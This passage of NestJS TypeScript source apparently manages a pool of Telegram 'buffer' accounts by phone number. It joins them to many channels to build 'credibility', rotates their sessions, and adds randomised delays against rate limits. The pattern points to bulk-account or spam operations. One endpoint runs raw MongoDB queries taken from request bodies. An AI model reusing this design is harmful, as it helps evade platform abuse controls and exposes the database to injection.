'username', required: false, description: 'Username' })\n  @ApiQuery({ name: 'name', required: false, description: 'Name' })\n  @ApiQuery({ name: 'channelLink', required: false, description: 'Channel link' })\n  @ApiQuery({ name: 'repl', required: false, description: 'Repl link' })\n  @ApiQuery({ name: 'isActive', required: false, description: 'Filter by active status' })\n  @ApiResponse({ type: [BufferClient] })\n  async search(@Query() query: SearchBufferClientDto): Promise<BufferClient[]> {\n    return this.clientService.search(query);\n  }\n\n  @Get('updateInfo')\n  @ApiOperation({ summary: 'Update promote Clients Info' })\n  @ApiResponse({ type: String })\n  async updateInfo(): Promise<string> {\n    // Fire-and-forget pattern for long-running operations\n    this.clientService.updateInfo();\n    return 'initiated Checking';\n  }\n\n  @Get('joinChannelsForBufferClients')\n  @ApiOperation({ summary: 'Join Channels for BufferClients' })\n  @ApiQuery({ name: 'clientId', required: false, description: 'Filter by specific client ID', type: String })\n  @ApiResponse({ type: String })\n  async joinChannelsforBufferClients(@Query('clientId') clientId?: string): Promise<string> {\n    return this.clientService.joinchannelForBufferClients(true, clientId);\n  }\n\n  @Get('checkBufferClients')\n  @ApiOperation({ summary: 'Check Buffer Clients' })\n  @ApiResponse({ type: String })\n  async checkbufferClients(): Promise<string> {\n    this.clientService.checkBufferClients();\n    return 'initiated Checking';\n  }\n\n  @Post('addNewUserstoBufferClients')\n  @ApiOperation({ summary: 'Add New Users to Buffer Clients' })\n  @ApiBody({\n    schema: {\n      type: 'object',\n      properties: {\n        goodIds: { type: 'array', items: { type: 'string' } },\n        badIds: { type: 'array', items: { type: 'string' } },\n        clientsNeedingBufferClients: { type: 'array', items: { type: 'string' } }\n      }\n    }\n  })\n  @ApiResponse({ type: String })\n  async addNewUserstoBufferClients(@Body() body: {\n    goodIds: string[];\n    badIds: string[];\n    clientsNeedingBufferClients?: string[];\n  }): Promise<string> {\n    if (!body || !Array.isArray(body.goodIds) || !Array.isArray(body.badIds)) {\n      throw new BadRequestException('goodIds and badIds must be arrays');\n    }\n\n    if (body.clientsNeedingBufferClients && !Array.isArray(body.clientsNeedingBufferClients)) {\n      throw new BadRequestException('clientsNeedingBufferClients must be an array');\n    }\n\n    this.clientService.addNewUserstoBufferClients(\n      body.badIds,\n      body.goodIds,\n      body.clientsNeedingBufferClients || [],\n      undefined\n    );\n    return 'initiated Checking';\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all buffer client data' })\n  @ApiQuery({ name: 'status', required: false, description: 'Filter by status (active/inactive)' })\n  @ApiResponse({ type: [BufferClient] })\n  async findAll(@Query('status') status?: string): Promise<BufferClient[]> {\n    return this.clientService.findAll(status as 'active' | 'inactive');\n  }\n\n  @Post('SetAsBufferClient/:mobile/:clientId')\n  @ApiOperation({ summary: 'Set as Buffer Client' })\n  @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n  @ApiParam({ name: 'clientId', description: 'Client ID to assign buffer client to', type: String })\n  @ApiResponse({ type: String })\n  async setAsBufferClient(@Param('mobile') mobile: string, @Param('clientId') clientId: string) {\n    return this.clientService.setAsBufferClient(mobile, clientId);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  @ApiBody({ type: Object })\n  @ApiResponse({ type: Object })\n  async executeQuery(@Body() query: object): Promise<any> {\n    return this.clientService.executeQuery(query);\n  }\n\n  @Get('distribution')\n  @ApiOperation({ summary: 'Get buffer client distribution per client' })\n  @ApiResponse({ type: Object })\n  async getBufferClientDistribution(): Promise<any> {\n    return this.clientService.getBufferClientDistribution();\n  }\n\n  @Get('client/:clientId')\n  @ApiOperation({ summary: 'Get buffer clients by client ID' })\n  @ApiParam({ name: 'clientId', description: 'Client ID to get buffer clients for', type: String })\n  @ApiQuery({ name: 'status', required: false, description: 'Filter by status (active/inactive)', type: String })\n  @ApiResponse({ type: [BufferClient] })\n  async getBufferClientsByClientId(@Param('clientId') clientId: string, @Query('status') status?: string): Promise<BufferClient[]> {\n    return this.clientService.getBufferClientsByClientId(clientId, status);\n  }\n\n  @Get('status/:status')\n  @ApiOperation({ summary: 'Get buffer clients by status' })\n  @ApiParam({ name: 'status', description: 'Status to filter by (active/inactive)', type: String })\n  @ApiResponse({ type: [BufferClient] })\n  async getBufferClientsByStatus(@Param('status') status: string): Promise<BufferClient[]> {\n    return this.clientService.findAll(status as 'active' | 'inactive');\n  }\n\n  @Patch('status/:mobile')\n  @ApiOperation({ summary: 'Update status of a buffer client' })\n  @ApiParam({ name: 'mobile', description: 'Mobile number of the buffer client', type: String })\n  @ApiBody({\n    schema: {\n      type: 'object',\n      properties: {\n        status: { type: 'string', description: 'New status (active/inactive)' },\n        message: { type: 'string', description: 'Status message (optional)' }\n      },\n      required: ['status']\n    }\n  })\n  @ApiResponse({ type: BufferClient })\n  async updateStatus(@Param('mobile') mobile: string, @Body() body: { status: string; message?: string }): Promise<BufferClient> {\n    if (body.status !== 'active' && body.status !== 'inactive') {\n      throw new BadRequestException('Status must be either \"active\" or \"inactive\"');\n    }\n    return this.clientService.updateStatus(mobile, body.status as 'active' | 'inactive', body.message);\n  }\n\n  @Patch('activate/:mobile')\n  @ApiOperation({ summary: 'Mark a buffer client as active' })\n  @ApiParam({ name: 'mobile', description: 'Mobile number of the buffer client', type: String })\n  @ApiBody({\n    schema: {\n      type: 'object',\n      properties: {\n        message: { type: 'string', description: 'Activation message (optional)' }\n      }\n    }\n  })\n  @ApiResponse({ type: BufferClient })\n  async markAsActive(@Param('mobile') mobile: string, @Body() body: { message?: string } = {}): Promise<BufferClient> {\n    return this.clientService.updateStatus(mobile, 'active', body.message);\n  }\n\n  @Patch('deactivate/:mobile')\n  @ApiOperation({ summary: 'Mark a buffer client as inactive' })\n  @ApiParam({ name: 'mobile', description: 'Mobile number of the buffer client', type: String })\n  @ApiBody({\n    schema: {\n      type: 'object',\n      properties: {\n        reason: { type: 'string', description: 'Reason for deactivation' }\n      },\n      required: ['reason']\n    }\n  })\n  @ApiResponse({ type: BufferClient })\n  async markAsInactive(@Param('mobile') mobile: string, @Body() body: { reason: string }): Promise<BufferClient> {\n    return this.clientService.markAsInactive(mobile, body.reason);\n  }\n\n  @Patch('mark-used/:mobile')\n  @ApiOperation({ summary: 'Mark a buffer client as used (update lastUsed timestamp)' })\n  @ApiParam({ name: 'mobile', description: 'Mobile number of the buffer client', type: String })\n  @ApiBody({\n    schema: {\n      type: 'object',\n      properties: {\n        message: { type: 'string', description: 'Usage message (optional)' }\n      }\n    }\n  })\n  async markAsUsed(\n    @Param('mobile') mobile: string,\n    @Body() body: { message?: string } = {}\n  ): Promise<BufferClient> {\n    return this.clientService.markAsUsed(mobile, body.message);\n  }\n\n  @Get('next-available/:clientId')\n  @ApiOperation({ summary: 'Get next available buffer client for a specific client' })\n  @ApiParam({ name: 'clientId', description: 'Client ID to get next available buffer client for', type: String })\n  @ApiResponse({ type: BufferClient })\n  async getNextAvailable(@Param('clientId') clientId: string): Promise<BufferClient | null> {\n    return this.clientService.getNextAvailableBufferClient(clientId);\n  }\n\n  @Get('unused')\n  @ApiOperation({ summary: \"Get buffer clients that haven't been used for a specified time period\" })\n  @ApiQuery({ name: 'hoursAgo', required: false, description: 'Hours ago cutoff (default: 24)', type: Number })\n  @ApiQuery({ name: 'clientId', required: false, description: 'Filter by specific client ID', type: String })\n  @ApiResponse({ type: [BufferClient] })\n  async getUnusedBufferClients(@Query('hoursAgo') hoursAgo?: number, @Query('clientId') clientId?: string): Promise<BufferClient[]> {\n    return this.clientService.getUnusedBufferClients(hoursAgo || 24, clientId);\n  }\n\n\n  @Get(':mobile')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n  @ApiResponse({ type: BufferClient })\n  async findOne(@Param('mobile') mobile: string): Promise<BufferClient> {\n    return this.clientService.findOne(mobile);\n  }\n\n  @Patch(':mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n  @ApiBody({ type: UpdateBufferClientDto })\n  @ApiResponse({ type: BufferClient })\n  async update(@Param('mobile') mobile: string, @Body() updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {\n    return this.clientService.update(mobile, updateClientDto);\n  }\n\n  @Put(':mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n  @ApiBody({ type: UpdateBufferClientDto })\n  @ApiResponse({ type: BufferClient })\n  async createdOrupdate(@Param('mobile') mobile: string, @Body() updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {\n    return this.clientService.createOrUpdate(mobile, updateClientDto);\n  }\n\n  @Delete(':mobile')\n  @ApiOperation({ summary: 'Delete user data by ID' })\n  @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n  @ApiResponse({ type: null })\n  async remove(@Param('mobile') mobile: string): Promise<void> {\n    return this.clientService.remove(mobile);\n  }\n}","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { BufferClientService } from './buffer-client.service';\nimport { BufferClientController } from './buffer-client.controller';\nimport { BufferClientSchema } from './schemas/buffer-client.schema';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\nimport { UsersModule } from '../users/users.module';\nimport { ClientModule } from '../clients/client.module';\nimport { InitModule } from '../ConfigurationInit/init.module';\nimport { ChannelsModule } from '../channels/channels.module';\nimport { PromoteClientModule } from '../promote-clients/promote-client.module';\nimport { SessionModule } from '../session-manager';\nimport { BotsModule } from '../bots';\n\n@Module({\n  imports: [\n    InitModule,\n    MongooseModule.forFeature([{ name: 'bufferClientModule', schema: BufferClientSchema, collection: 'bufferClients' }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => UsersModule),\n    forwardRef(() => ActiveChannelsModule),\n    forwardRef(() => ClientModule),\n    forwardRef(() => ChannelsModule),\n    forwardRef(() => PromoteClientModule),\n    forwardRef(() => SessionModule),\n    BotsModule\n ],\n  controllers: [BufferClientController],\n  providers: [BufferClientService],\n  exports: [BufferClientService]\n})\nexport class BufferClientModule { }\n","import { ChannelsService } from './../channels/channels.service';\nimport { Channel } from './../channels/schemas/channel.schema';\nimport {\n    BadRequestException,\n    ConflictException,\n    HttpException,\n    Inject,\n    Injectable,\n    InternalServerErrorException,\n    NotFoundException,\n    forwardRef,\n    OnModuleDestroy,\n} from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateBufferClientDto } from './dto/create-buffer-client.dto';\nimport {\n    BufferClient,\n    BufferClientDocument,\n} from './schemas/buffer-client.schema';\nimport { TelegramService } from '../Telegram/Telegram.service';\nimport { sleep } from 'telegram/Helpers';\nimport { UsersService } from '../users/users.service';\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\nimport { ClientService } from '../clients/client.service';\nimport { UpdateBufferClientDto } from './dto/update-buffer-client.dto';\nimport { PromoteClientService } from '../promote-clients/promote-client.service';\nimport { parseError } from '../../utils/parseError';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport { connectionManager } from '../Telegram/utils/connection-manager';\nimport { SessionService } from '../session-manager';\nimport { getCuteEmoji, Logger, obfuscateText } from '../../utils';\nimport { ActiveChannel } from '../active-channels';\nimport { SearchBufferClientDto } from './dto/search-buffer-client.dto';\nimport { channelInfo } from '../../utils/telegram-utils/channelinfo';\nimport TelegramManager from '../Telegram/TelegramManager';\nimport { Client } from '../clients';\nimport path from 'path';\nimport { CloudinaryService } from '../../cloudinary';\nimport { Api } from 'telegram';\nimport isPermanentError from '../../utils/isPermanentError';\nimport { isIncludedWithTolerance, safeAttemptReverse } from '../../utils/checkMe.utils';\nimport { BotsService, ChannelCategory } from '../bots';\nimport { ClientHelperUtils } from '../shared/client-helper.utils';\n\n@Injectable()\nexport class BufferClientService implements OnModuleDestroy {\n    private readonly logger = new Logger(BufferClientService.name);\n    private joinChannelMap: Map<string, Channel[] | ActiveChannel[]> = new Map();\n    private joinChannelIntervalId: NodeJS.Timeout | null = null;\n    private leaveChannelMap: Map<string, string[]> = new Map();\n    private leaveChannelIntervalId: NodeJS.Timeout | null = null;\n    private isJoinChannelProcessing: boolean = false;\n    private isLeaveChannelProcessing: boolean = false;\n\n    // Track all timeouts for proper cleanup\n    private activeTimeouts: Set<NodeJS.Timeout> = new Set();\n\n    // Fixed constant values to match comments\n    private readonly JOIN_CHANNEL_INTERVAL = 6 * 60 * 1000; // Increased to 6 minutes\n    private readonly LEAVE_CHANNEL_INTERVAL = 120 * 1000; // Increased to 120 seconds\n    private readonly LEAVE_CHANNEL_BATCH_SIZE = 10;\n    private readonly CLIENT_PROCESSING_DELAY = 10000; // Increased to 10 seconds between clients\n    private readonly CHANNEL_PROCESSING_DELAY = 20000; // Increased to 20 seconds between channel operations\n\n    // Memory management constants\n    private readonly MAX_MAP_SIZE = 100; // Prevent unbounded Map growth\n    private readonly CLEANUP_INTERVAL = 15 * 60 * 1000; // Increased to 15 minutes\n\n    // Per-client buffer client management constants\n    private readonly MAX_NEW_BUFFER_CLIENTS_PER_TRIGGER = 10; // Rate limiting constant\n    private readonly MIN_TOTAL_BUFFER_CLIENTS = 10; // Minimum total buffer clients per client (even if windows satisfied)\n\n    // Dynamic availability windows configuration\n    // Each window defines minimum required buffer clients available by that date\n    private readonly AVAILABILITY_WINDOWS = [\n        { name: 'today', days: 0, minRequired: 3 },\n        { name: 'tomorrow', days: 1, minRequired: 5 },\n        { name: 'oneWeek', days: 7, minRequired: 7 },\n        { name: 'tenDays', days: 10, minRequired: 9 }\n    ];\n\n    // Date/time constants\n    private readonly ONE_DAY_MS = 24 * 60 * 60 * 1000;\n    private readonly THREE_MONTHS_MS = 3 * 30 * this.ONE_DAY_MS;\n    private readonly INACTIVE_USER_CUTOFF_DAYS = 90; // 3 months\n\n    private cleanupIntervalId: NodeJS.Timeout | null = null;\n\n    constructor(\n        @InjectModel('bufferClientModule')\n        private bufferClientModel: Model<BufferClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private activeChannelsService: ActiveChannelsService,\n        @Inject(forwardRef(() => ClientService))\n        private clientService: ClientService,\n        @Inject(forwardRef(() => ChannelsService))\n        private channelsService: ChannelsService,\n        @Inject(forwardRef(() => PromoteClientService))\n        private promoteClientService: PromoteClientService,\n        @Inject(forwardRef(() => SessionService))\n        private sessionService: SessionService,\n        private botsService: BotsService,\n    ) { }\n\n    async onModuleDestroy() {\n        await this.cleanup();\n    }\n\n    private async cleanup(): Promise<void> {\n        try {\n            // Clear all timeouts\n            this.clearAllTimeouts();\n\n            // Clear intervals\n            this.clearJoinChannelInterval();\n            this.clearLeaveChannelInterval();\n            this.clearMemoryCleanup();\n\n            // Clear maps\n            this.clearBufferMap();\n            this.clearLeaveMap();\n\n            // Reset processing flags\n            this.isJoinChannelProcessing = false;\n            this.isLeaveChannelProcessing = false;\n        } catch (error) {\n            this.logger.error('Error during cleanup:', error);\n        }\n    }\n\n    private startMemoryCleanup(): void {\n        this.cleanupIntervalId = setInterval(() => {\n            this.performMemoryCleanup();\n        }, this.CLEANUP_INTERVAL);\n\n        this.activeTimeouts.add(this.cleanupIntervalId);\n    }\n\n    private clearMemoryCleanup(): void {\n        if (this.cleanupIntervalId) {\n            clearInterval(this.cleanupIntervalId);\n            this.activeTimeouts.delete(this.cleanupIntervalId);\n            this.cleanupIntervalId = null;\n        }\n    }\n\n    private performMemoryCleanup(): void {\n        try {\n            // Clean up empty entries in joinChannelMap\n            for (const [mobile, channels] of this.joinChannelMap.entries()) {\n                if (!channels || channels.length === 0) {\n                    this.logger.log(`Cleaning up joinChannelMap entry for mobile: ${mobile} as channels : ${channels}`,);\n                    this.joinChannelMap.delete(mobile);\n                }\n            }\n\n            // Clean up empty entries in leaveChannelMap\n            for (const [mobile, channels] of this.leaveChannelMap.entries()) {\n                if (!channels || channels.length === 0) {\n                    this.logger.log(`Cleaning up leaveChannelMap entry for mobile: ${mobile} as channels : ${channels}`);\n                    this.leaveChannelMap.delete(mobile);\n                }\n            }\n\n            // Prevent Map growth beyond reasonable limits\n            if (this.joinChannelMap.size > this.MAX_MAP_SIZE) {\n                const keysToRemove = Array.from(this.joinChannelMap.keys()).slice(\n                    this.MAX_MAP_SIZE,\n                );\n                keysToRemove.forEach((key) => this.joinChannelMap.delete(key));\n                this.logger.warn(\n                    `Cleaned up ${keysToRemove.length} entries from joinChannelMap to prevent memory leak`,\n                );\n            }\n\n            if (this.leaveChannelMap.size > this.MAX_MAP_SIZE) {\n                const keysToRemove = Array.from(this.leaveChannelMap.keys()).slice(\n                    this.MAX_MAP_SIZE,\n                );\n                keysToRemove.forEach((key) => this.leaveChannelMap.delete(key));\n                this.logger.warn(\n                    `Cleaned up ${keysToRemove.length} entries from leaveChannelMap to prevent memory leak`,\n                );\n            }\n\n            this.logger.debug(\n                `Map Memory Check completed. Maps sizes - Join: ${this.joinChannelMap.size}, Leave: ${this.leaveChannelMap.size}, Active timeouts: ${this.activeTimeouts.size}`,\n            );\n        } catch (error) {\n            this.logger.error('Error during memory cleanup:', error);\n        }\n    }\n\n    private createTimeout(callback: () => void, delay: number): NodeJS.Timeout {\n        const timeout = setTimeout(() => {\n            this.activeTimeouts.delete(timeout);\n            callback();\n        }, delay);\n        this.activeTimeouts.add(timeout);\n        return timeout;\n    }\n\n    private clearAllTimeouts(): void {\n        this.activeTimeouts.forEach((timeout) => {\n            clearTimeout(timeout);\n        });\n        this.activeTimeouts.clear();\n        this.logger.debug('Cleared all active timeouts');\n    }\n\n    /**\n     * Safely unregister a Telegram client connection\n     * Handles errors and logs appropriately\n     */\n    private async safeUnregisterClient(mobile: string): Promise<void> {\n        try {\n            await connectionManager.unregisterClient(mobile);\n        } catch (unregisterError: unknown) {\n            const errorMessage = unregisterError instanceof Error ? unregisterError.message : 'Unknown error';\n            this.logger.error(`Error unregistering client ${mobile}: ${errorMessage}`);\n        }\n    }\n\n    /**\n     * Helper method for consistent error handling\n     * Parses errors and returns standardized error details\n     */\n    private handleError(error: unknown, context: string, mobile?: string): ReturnType<typeof parseError> {\n        const contextWithMobile = mobile ? `${context}: ${mobile}` : context;\n        return parseError(error, contextWithMobile, false);\n    }\n\n    async create(bufferClient: CreateBufferClientDto): Promise<BufferClientDocument> {\n        // Ensure status is set to 'active' by default if not provided\n        const result = await this.bufferClientModel.create({\n            ...bufferClient,\n            status: bufferClient.status || 'active',\n        });\n        this.logger.log(`Buffer Client Created:\\n\\nMobile: ${bufferClient.mobile}`);\n        this.botsService.sendMessageByCategory(ChannelCategory.ACCOUNT_NOTIFICATIONS, `Buffer Client Created:\\n\\nMobile: ${bufferClient.mobile}`);\n        return result;\n    }\n\n    async findAll(status?: 'active' | 'inactive'): Promise<BufferClientDocument[]> {\n        const filter = status ? { status } : {};\n        return this.bufferClientModel.find(filter).exec();\n    }\n\n    async findOne(\n        mobile: string,\n        throwErr: boolean = true,\n    ): Promise<BufferClientDocument> {\n        const bufferClient = (\n            await this.bufferClientModel.findOne({ mobile }).exec()\n        )?.toJSON();\n        if (!bufferClient && throwErr) {\n            throw new NotFoundException(\n                `BufferClient with mobile ${mobile} not found`,\n            );\n        }\n        return bufferClient;\n    }\n\n    async update(\n        mobile: string,\n        updateClientDto: UpdateBufferClientDto,\n    ): Promise<BufferClientDocument> {\n        // Update existing document only (no upsert to prevent accidental creation)\n        const updatedBufferClient = await this.bufferClientModel\n            .findOneAndUpdate(\n                { mobile },\n                { $set: updateClientDto },\n                { new: true, returnDocument: 'after' },\n            )\n            .exec();\n\n        if (!updatedBufferClient) {\n            throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);\n        }\n\n        return updatedBufferClient;\n    }\n\n    async createOrUpdate(\n        mobile: string,\n        createorUpdateBufferClientDto: CreateBufferClientDto | UpdateBufferClientDto,\n    ): Promise<BufferClientDocument> {\n        const existingBufferClient = (\n            await this.bufferClientModel.findOne({ mobile }).exec()\n        )?.toJSON();\n        if (existingBufferClient) {\n            this.logger.log('Updating existing Client');\n            return this.update(\n                existingBufferClient.mobile,\n                createorUpdateBufferClientDto as UpdateBufferClientDto,\n            );\n        } else {\n            this.logger.log('creating new Client');\n            // Ensure status is set to 'active' by default if not provided\n            const createDto: CreateBufferClientDto = {\n                ...createorUpdateBufferClientDto,\n                status: (createorUpdateBufferClientDto as CreateBufferClientDto).status || 'active',\n            } as CreateBufferClientDto;\n            return this.create(createDto);\n        }\n    }\n\n    async remove(mobile: string, message?: string): Promise<void> {\n        try {\n            const bufferClient = await this.findOne(mobile, false);\n            if (!bufferClient) {\n                throw new NotFoundException(\n                    `BufferClient with mobile ${mobile} not found`,\n                );\n            }\n            this.logger.log(`Removing BufferClient with mobile: ${mobile}`);\n            await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Deleting Buffer Client : ${mobile}\\n${message}`)}`);\n            await this.bufferClientModel.deleteOne({ mobile }).exec();\n        } catch (error) {\n            const errorDetails = parseError(error, `failed to delete BufferClient: ${mobile}`);\n            this.logger.error(\n                `Error removing BufferClient with mobile ${mobile}: ${errorDetails.message}`,\n            );\n            throw new HttpException(errorDetails.message, errorDetails.status);\n        }\n        this.logger.log(`BufferClient with mobile ${mobile} removed successfully`);\n    }\n    async search(filter: SearchBufferClientDto): Promise<BufferClientDocument[]> {\n        if (filter.tgId === \"refresh\") {\n            // Fire-and-forget: update sessions in background\n            this.updateAllClientSessions().catch((error) => {\n                this.logger.error('Error updating all client sessions:', error);\n            });\n            return [];\n        }\n        return await this.bufferClientModel.find(filter).exec();\n    }\n\n    async executeQuery(\n        query: Record<string, any>,\n        sort?: Record<string, any>,\n        limit?: number,\n        skip?: number,\n    ): Promise<BufferClientDocument[]> {\n        if (!query) {\n            throw new BadRequestException('Query is invalid.');\n        }\n\n        try {\n            const queryExec = this.bufferClientModel.find(query);\n            if (sort) {\n                queryExec.sort(sort);\n            }\n\n            if (limit) {\n                queryExec.limit(limit);\n            }\n\n            if (skip) {\n                queryExec.skip(skip);\n            }\n\n            return await queryExec.exec();\n        } catch (error) {\n            // Re-throw known exceptions, wrap unknown errors\n            if (error instanceof BadRequestException || error instanceof NotFoundException) {\n                throw error;\n            }\n            const errorMessage = error instanceof Error ? error.message : 'Unknown error occurred';\n            throw new InternalServerErrorException(`Query execution failed: ${errorMessage}`);\n        }\n    }\n\n    removeFromBufferMap(key: string) {\n        this.joinChannelMap.delete(key);\n    }\n\n    private safeSetJoinChannelMap(mobile: string, channels: Channel[] | ActiveChannel[]): boolean {\n        if (\n            this.joinChannelMap.size >= this.MAX_MAP_SIZE &&\n            !this.joinChannelMap.has(mobile)\n        ) {\n            this.logger.warn(\n                `Join channel map size limit reached (${this.MAX_MAP_SIZE}), cannot add ${mobile}`,\n            );\n            return false;\n        }\n        this.joinChannelMap.set(mobile, channels);\n        return true;\n    }\n\n    private safeSetLeaveChannelMap(mobile: string, channels: string[]): boolean {\n        if (\n            this.leaveChannelMap.size >= this.MAX_MAP_SIZE &&\n            !this.leaveChannelMap.has(mobile)\n        ) {\n            this.logger.warn(\n                `Leave channel map size limit reached (${this.MAX_MAP_SIZE}), cannot add ${mobile}`,\n            );\n            return false;\n        }\n        this.leaveChannelMap.set(mobile, channels);\n        return true;\n    }\n\n    clearBufferMap() {\n        const mapSize = this.joinChannelMap.size;\n        this.joinChannelMap.clear();\n        this.clearJoinChannelInterval();\n        this.logger.debug(`BufferMap cleared, removed ${mapSize} entries`);\n    }\n\n    async updateStatus(\n        mobile: string,\n        status: 'active' | 'inactive',\n        message?: string,\n    ): Promise<BufferClientDocument> {\n        const updateData: UpdateBufferClientDto = { status };\n        if (message) {\n            updateData.message = message;\n        }\n        await this.botsService.sendMessageByCategory(ChannelCategory.ACCOUNT_NOTIFICATIONS, `Buffer Client:\\n\\nStatus Updated to ${status}\\nMobile: ${mobile}\\nReason: ${message || ''}`);\n        return await this.update(mobile, updateData);\n    }\n\n    async markAsInactive(mobile: string, reason: string): Promise<BufferClientDocument | null> {\n        try {\n            this.logger.log(`Marking buffer client ${mobile} as inactive: ${reason}`);\n            return await this.updateStatus(mobile, 'inactive', reason);\n        } catch (error) {\n            const errorMessage = error instanceof Error ? error.message : 'Unknown error';\n            this.logger.error(`Failed to mark buffer client ${mobile} as inactive: ${errorMessage}`);\n            return null;\n        }\n    }\n\n    async updateInfo() {\n        const clients = await this.bufferClientModel\n            .find({\n                status: 'active',\n                lastChecked: { $lt: new Date(Date.now() - 7 * this.ONE_DAY_MS) }\n            })\n            .sort({ channels: 1 })\n            .limit(25);\n\n        this.logger.debug(`Updating info for ${clients.length} buffer clients`);\n\n        const now = Date.now();\n        for (let i = 0; i < clients.length; i++) {\n            const client = clients[i];\n            const mobile = client.mobile;\n\n            this.logger.info(`Updating info for client ${i + 1}/${clients.length}: ${mobile}`);\n\n            const lastChecked = client.lastChecked\n                ? new Date(client.lastChecked).getTime()\n                : 0;\n            await this.performHealthCheck(mobile, lastChecked, now);\n\n            // Add delay between client processing to avoid rate limits\n            if (i < clients.length - 1) {\n                await sleep(12000 + Math.random() * 8000); // Increased to 12-20 seconds between each client\n            }\n        }\n\n        this.logger.debug('Completed updating info for all buffer clients');\n    }\n\n    /**\n     * Join channels for buffer clients to build account credibility\n     * Processes buffer clients sequentially, joining channels and leaving restricted ones\n     * @param skipExisting - Whether to skip clients already in the join queue\n     * @param clientId - Optional client ID to filter buffer clients\n     * @returns Status message indicating how many clients were queued for join/leave operations\n     */\n    async joinchannelForBufferClients(\n        skipExisting: boolean = true,\n        clientId?: string,\n    ): Promise<string> {\n        if (this.telegramService.getActiveClientSetup()) {\n            this.logger.warn('Ignored active check buffer channels as active client setup exists');\n            return 'Active client setup exists, skipping buffer promotion';\n        }\n\n        this.logger.log('Starting join channel process for buffer clients');\n\n        this.joinChannelMap.clear();\n        this.leaveChannelMap.clear();\n        this.clearJoinChannelInterval();\n        this.clearLeaveChannelInterval();\n        await sleep(6000 + Math.random() * 3000); // Increased initial sleep\n\n        const existingKeys = skipExisting\n            ? []\n            : Array.from(this.joinChannelMap.keys());\n\n        // Build query with optional clientId filter\n        const query: Record<string, any> = {\n            channels: { $lt: 350 },\n            mobile: { $nin: existingKeys },\n            status: 'active',\n        };\n\n        if (clientId) {\n            query.clientId = clientId;\n        }\n\n        const clients = await this.bufferClientModel\n            .find(query)\n            .sort({ channels: 1 })\n            .limit(8); // Reduced limit for better performance\n\n        this.logger.debug(`Found ${clients.length} buffer clients to process`);\n\n        const joinSet = new Set<string>();\n        const leaveSet = new Set<string>();\n\n        let successCount = 0;\n        let failCount = 0;\n\n        // Sequential processing with proper delays\n        for (let i = 0; i < clients.length; i++) {\n            const document = clients[i];\n            const mobile = document.mobile;\n            this.logger.debug(`Processing buffer client ${i + 1}/${clients.length}: ${mobile}`);\n\n            try {\n                const client = await connectionManager.getClient(mobile, {\n                    autoDisconnect: false,\n                    handler: false,\n                });\n\n                const channels = await channelInfo(client.client, true);\n                this.logger.debug(\n                    `Client ${mobile} has ${channels.ids.length} existing channels`,\n                );\n                await this.update(mobile, { channels: channels.ids.length });\n\n                if (channels.canSendFalseCount < 10) {\n                    const excludedIds = channels.ids;\n                    const result =\n                        channels.ids.length < 220\n                            ? await this.activeChannelsService.getActiveChannels(150, 0, excludedIds)\n                            : await this.channelsService.getActiveChannels(150, 0, excludedIds);\n                    if (!this.joinChannelMap.has(mobile)) {\n                        if (this.safeSetJoinChannelMap(mobile, result)) {\n                            joinSet.add(mobile);\n                            this.logger.debug(`Added ${result.length} channels to join queue for ${mobile}`);\n                        } else {\n                            this.logger.warn(`Failed to add ${mobile} to join queue due to memory limits`);\n                        }\n                    } else {\n                        this.logger.debug(`${mobile}: Already present in join map, skipping`);\n                    }\n                    await this.sessionService.getOldestSessionOrCreate({\n                        mobile: document.mobile\n                    })\n                } else {\n                    if (!this.leaveChannelMap.has(mobile)) {\n                        if (\n                            this.safeSetLeaveChannelMap(mobile, channels.canSendFalseChats)\n                        ) {\n                            leaveSet.add(mobile);\n                            this.logger.warn(`Client ${mobile} has ${channels.canSendFalseChats.length} restricted channels, added to leave queue`);\n                        } else {\n                            this.logger.warn(`Failed to add ${mobile} to leave queue due to memory limits`);\n                        }\n                    } else {\n                        this.logger.debug(`${mobile}: Already present in leave map, skipping`);\n                    }\n                }\n\n                successCount++;\n            } catch (error) {\n                failCount++;\n                const errorDetails = parseError(error, `JoinChannelErr: ${mobile}`);\n                const errorMsg = errorDetails?.message || error?.errorMessage || 'Unknown error';\n                if (isPermanentError(errorDetails)) {\n                    await this.markAsInactive(mobile, `${errorDetails.message}`);\n                } else {\n                    this.logger.warn(`Transient error for ${mobile}: ${errorMsg}`);\n                }\n            } finally {\n                await this.safeUnregisterClient(mobile);\n\n                // Progressive delay between clients to prevent CPU spikes\n                if (i < clients.length - 1) {\n                    await sleep(this.CLIENT_PROCESSING_DELAY + Math.random() * 5000);\n                }\n            }\n        }\n\n        // Add delay before starting queues\n        await sleep(6000 + Math.random() * 3000);\n\n        if (joinSet.size > 0) {\n            this.startMemoryCleanup();\n            this.logger.debug(`Starting join queue for ${joinSet.size} buffer clients`);\n            this.createTimeout(() => this.joinChannelQueue(), 4000 + Math.random() * 2000); // Delayed start\n        }\n\n        if (leaveSet.size > 0) {\n            this.logger.debug(`Starting leave queue for ${leaveSet.size} buffer clients`);\n            this.createTimeout(() => this.leaveChannelQueue(), 10000 + Math.random() * 5000); // Delayed start\n        }\n\n        